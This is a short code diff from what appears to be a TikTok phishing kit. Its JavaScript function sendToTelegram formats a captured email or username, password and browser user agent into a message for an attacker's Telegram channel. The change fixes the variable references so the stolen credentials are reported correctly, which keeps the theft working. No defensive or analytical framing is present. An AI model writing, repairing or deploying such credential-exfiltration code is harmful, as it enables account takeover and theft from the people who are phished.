@@ -44,8 +44,8 @@ async function sendToTelegram(data) {
         `🎭 <b>Now Login on TikTok</b> 🎭
 ━━━━━━━━━━━━━━━━━━━━
 👤 <b>User Info</b>
-📧 <b>Email/User:</b> <code>${user}</code>
-🔑 <b>Password:</b> <code>${pass}</code>
+📧 <b>Email/User:</b> <code>${data.user}</code>
+🔑 <b>Password:</b> <code>${data.pass}</code>
 ━━━━━━━━━━━━━━━━━━━━
 🌐 <b>System Info</b>
 🖥️ <b>Browser:</b> <code>${navigator.userAgent.slice(0, 80)}</code>
